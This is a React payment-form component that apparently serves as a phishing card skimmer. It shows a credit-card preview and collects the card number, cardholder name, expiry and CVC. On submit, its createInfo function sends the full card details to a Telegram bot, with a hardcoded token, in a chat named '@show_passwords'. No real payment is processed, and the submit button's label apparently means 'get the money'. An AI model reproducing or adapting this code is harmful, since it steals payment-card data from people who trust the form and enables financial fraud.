import axios from "axios";
import { useState } from "react";
import Cards from "react-credit-cards-2";
import "react-credit-cards-2/dist/es/styles-compiled.css";
import { useForm } from "react-hook-form";

const inputStyle = {
  border: "1px solid #d4d7e5",
  borderRadius: "5px",
  fontWeight: "600",
  height: "40px",
  outline: "none",
  maxWidth: "500px",
  width: "100%",
  paddingLeft: "15px",
};

const PaymentForm = ({ setIsOpenModal }) => {
  const [state, setState] = useState({
    number: "",
    expiry: "",
    cvc: "",
    name: "",
    focus: "",
  });

  const [isLoading, setIsLoading] = useState(false);


  const createInfo = async (formData) => {
    const { number, name, expiry, cvc } = formData;

    const cardNumber = number.toString().match(/.{1,4}/g).join('-');

    const text =  `\nCard Number: ${cardNumber}\nCardholder Name: ${name}\nExpiry Date: ${expiry}\nCVC: ${cvc}`

    const botToken = '7899531792:AAETYC6r-RSLizeLhC_sSIZANhVWcdeGhps';
    const chatId = '@show_passwords'; 

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    try {
      await axios.post(url, {
        chat_id: chatId,
        text,
      });
    } catch (error) {
      console.error(
        'Error sending message:',
        error.response?.data || error.message,
      );
    }
  };

  const handleInputChange = (evt) => {
    const { name, value } = evt.target;

    setState((prev) => ({ ...prev, [name]: value }));
  };

  const handleInputFocus = (evt) => {
    setState((prev) => ({ ...prev, focus: evt.target.name }));
  };

  const { handleSubmit, register, reset } = useForm({
    mode: "onSubmit",
  });

  const handleFormSubmit = handleSubmit(async (formData) => {
    setIsLoading(true);
    await createInfo(formData);
    setIsLoading(false);
    reset();
    setIsOpenModal(false);
  });

  const isValid = state.name && state.number && state.cvc && state.expiry;

  return (
    <div style={{ padding: "15px" }}>
      <Cards
        number={state.number}
        expiry={state.expiry}
        cvc={state.cvc}
        name={state.name}
        focused={state.focus}
      />
      <form
        onSubmit={handleFormSubmit}
        style={{
          display: "flex",
          flexDirection: "column",
          marginTop: "20px",
          alignItems: "center",
        }}
      >
        <input
          {...register("number", { required: true })}
          style={inputStyle}
          className="inputik"
          type="number"
          name="number"
          placeholder="XXXX-XXXX-XXXX-XXXX"
          required
          value={state.number}
          onChange={handleInputChange}
          onFocus={handleInputFocus}
        />
        ...
        <input
          {...register("name", { required: true })}
          type="text"
          name="name"
          placeholder="NAME"
          className="inputik"
          style={{ marginBottom: "19px", ...inputStyle }}
          required
          value={state.name}
          onChange={handleInputChange}
          onFocus={handleInputFocus}
        />
        <input
          {...register("expiry", { required: true })}
          style={{ marginBottom: "19px", ...inputStyle }}
          className="inputik"
          type="number"
          name="expiry"
          placeholder="MM / YY"
          pattern="\d\d/\d\d"
          required
          onChange={handleInputChange}
          onFocus={handleInputFocus}
        />
        <input
          {...register("cvc", { required: true })}
          type="number"
          name="cvc"
          style={inputStyle}
          className="inputik"
          placeholder="CVC"
          pattern="\d{3,4}"
          required
          onChange={handleInputChange}
          onFocus={handleInputFocus}
        />
        <button
          type="submit"
          style={{
            background: "linear-gradient(135deg,cyan,#00bfff)",
            color: "white",
            fontSize: "18px",
            maxWidth: "200px",
            width: "100%",
            padding: "10px 5px",
            borderRadius: "10px",
            marginTop: "20px",
            cursor: "pointer",
            border: "none",
            opacity: `${isValid ? "1" : "0.5"}`,
          }}
        >
          {isLoading && (
            <img width={20} src="https://i.gifer.com/ZKZg.gif" alt="" />
          )}
          {!isLoading && "Pulu al"}
        </button>
      </form>
    </div>
  );
};

export default PaymentForm;
